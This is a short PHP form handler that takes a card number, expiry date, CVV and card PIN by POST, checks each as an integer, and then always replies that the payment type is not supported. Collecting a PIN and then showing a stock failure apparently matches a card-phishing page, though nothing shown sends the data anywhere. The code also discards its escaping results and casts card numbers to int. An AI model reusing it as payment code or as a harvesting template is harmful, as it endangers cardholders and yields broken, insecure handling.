<?php
require_once __DIR__.("/sessionPage.php");



if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__)==
realpath($_SERVER['SCRIPT_FILENAME'])){

  header("Location: Warning.php");
  exit;

      header('HTTP/1.0 403 Forbiddden',TRUE,403);
      die("<h3> 403 Access denied!The file you request for does not exist.</h3>");
}


if ($_SERVER["REQUEST_METHOD"] == "POST"){

$card_no = $exp = $cvv =$Pin="";



$card_no = (int) filter_var($_POST["card_no"],FILTER_VALIDATE_INT);

if (empty($card_no)){
$message_status ="enter card number"
;

require_once __DIR__.("/Failed.php");

die();

}else{

htmlspecialchars($card_no);



}



$exp = (int) filter_var($_POST["Exp"],FILTER_VALIDATE_INT);

if (empty($exp)){
$message_status ="enter card expiry date"
;

require_once __DIR__.("/Failed.php");

die();

}else{

htmlspecialchars($exp);



}


$ccv = (int) filter_var($_POST["cvv"],FILTER_VALIDATE_INT);

if (empty($ccv)){
$message_status ="enter card 3 digit 3 CCV";

require_once __DIR__.("/Failed.php");

die();

}else{

htmlspecialchars($ccv);



}


$Pin = (int) filter_var($_POST["Pin"],FILTER_VALIDATE_INT);

if (empty($Pin)){
$message_status ="enter card Pin"
;

require_once __DIR__.("/Failed.php");

die();

}else{

htmlspecialchars($Pin);



}




$message_status ="Payment type not supported,please check back soon";

require_once __DIR__.("/Failed.php");
die();


}



?>